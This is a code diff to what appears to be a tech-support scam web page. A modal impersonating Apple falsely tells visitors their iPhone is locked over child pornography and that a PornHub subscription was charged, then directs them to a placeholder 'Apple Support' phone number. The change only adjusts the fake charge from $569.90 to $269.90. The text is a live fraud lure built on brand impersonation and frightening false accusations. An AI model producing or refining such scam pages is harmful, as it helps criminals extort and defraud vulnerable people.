@@ -75,7 +75,7 @@
                 <div class="modal-content" id="applealertmodeltwo">
                     <div class="modal-body text-center">
                         <div class="alert-text">
-                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:${number}">${number}</a> to unlock it!
+                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $269.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:${number}">${number}</a> to unlock it!
                         </div>
 
                         
